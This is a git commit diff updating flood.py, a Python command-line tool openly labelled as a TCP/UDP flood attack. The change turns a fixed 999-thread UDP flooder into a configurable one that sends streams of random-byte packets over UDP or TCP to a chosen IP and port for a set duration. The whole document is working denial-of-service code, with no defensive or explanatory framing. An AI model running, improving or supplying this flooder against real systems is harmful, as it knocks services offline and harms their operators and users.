d8340eb9b795a06f5739d163008d2094aca4f266
range <86251361+ItzSasuke@users.noreply.github.com>
2024-07-14 13:34:14 -0700

    Update flood.py

--- flood.py
+++ flood.py
@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-
+# Code by LeeOn123
 import argparse
 import random
 import socket
@@ -9,33 +9,58 @@ import time
 ap = argparse.ArgumentParser()
 ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
 ap.add_argument("-p", "--port", required=True, type=int, help="Port")
-ap.add_argument("-ti", "--time", type=int, default=60, help="Time duration for attack in seconds")
+ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
+ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
+ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
+ap.add_argument("-ti", "--time", type=int, default=60, help="Duration in seconds")
 args = vars(ap.parse_args())
 
+print("--> C0de By Lee0n123 <--")
+print("#-- TCP/UDP FLOOD --#")
 ip = args['ip']
 port = args['port']
-attack_time = args['time']
+choice = args['choice']
+times = args['times']
+threads = args['threads']
+duration = args['time']
 
-def udp_flood():
+def run():
     data = random._urandom(1024)
+    i = random.choice(("[*]","[!]","[#]"))
     start_time = time.time()
-    while (time.time() - start_time) < attack_time:
+    while time.time() - start_time < duration:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             addr = (str(ip), int(port))
-            s.sendto(data, addr)
-        except socket.error as e:
-            print("[#] Error: " + str(e))
-        finally:
+            for x in range(times):
+                s.sendto(data, addr)
+            print(i + " Sent!!!")
+        except:
+            print("[!] Error!!!")
+
+def run2():
+    data = random._urandom(16)
+    i = random.choice(("[*]","[!]","[#]"))
+    start_time = time.time()
+    while time.time() - start_time < duration:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+            s.send(data)
+            for x in range(times):
+                s.send(data)
+            print(i + " Sent!!!")
+        except:
             s.close()
+            print("[*] Error")
 
-threads = []
-for _ in range(999):
-    th = threading.Thread(target=udp_flood)
-    th.start()
-    threads.append(th)
+for y in range(threads):
+    if choice == 'y':
+        th = threading.Thread(target=run)
+        th.start()
+    else:
+        th = threading.Thread(target=run2)
+        th.start()
 
-for th in threads:
-    th.join()
-
-print("Attack finished.")
+time.sleep(duration)  # Wait for the specified duration
+print("Attack finished. Exiting...")
